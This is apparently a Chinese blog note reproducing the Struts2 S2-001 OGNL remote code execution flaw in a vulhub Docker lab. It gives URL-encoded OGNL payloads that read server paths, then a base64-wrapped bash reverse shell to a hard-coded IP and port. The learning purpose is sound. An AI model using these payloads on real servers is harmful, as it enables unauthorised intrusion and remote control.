ailx10说：这篇是2024年9月之前写的，后来又改过。开始刷 Struts2 系列时，我先从 S2-001 看起。没有一上来就追连接，而是先用表达式看运行目录、Web 路径，再试执行并把输出写回页面，最后才接后面的步骤。这样的顺序让我能把那串 OGNL 拆成几个看得见的小动作，而不只是复制一个大载荷。笔记记录了当时的请求和结果，不过版本与页面回填过程还需要结合环境看；只说“过滤不严”太宽泛，真正值得弄明白的是输入在哪个环节又被当成表达式了。

---

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明 S2-001 远程代码执行漏洞 环境搭建成功了

![](/notes-assets/c31d6df028db78817d8c.webp)

（1）获取tomcat执行路径：

```
%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
```

使用URL编码

```
%25%7B%22tomcatBinDir%7B%22%2B%40java.lang.System%40getProperty(%22user.dir%22)%2B%22%7D%22%7D
```

![](/notes-assets/2ebfb824da7d35c09d10.webp)

（2）获取Web路径：

```
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
```

使用URL编码

```
%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23response%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23response.println(%23req.getRealPath(%27%2F%27))%2C%23response.flush()%2C%23response.close()%7D
```

（4）命令执行：反弹shell

```
bash -i >& /dev/tcp/144.34.162.13/6666 0>&1
```

base64编码

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMTYyLjEzLzY2NjYgMD4mMQ==
```

bash -c 执行

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMTYyLjEzLzY2NjYgMD4mMQ==} |{base64,-d}|{bash,-i}
```

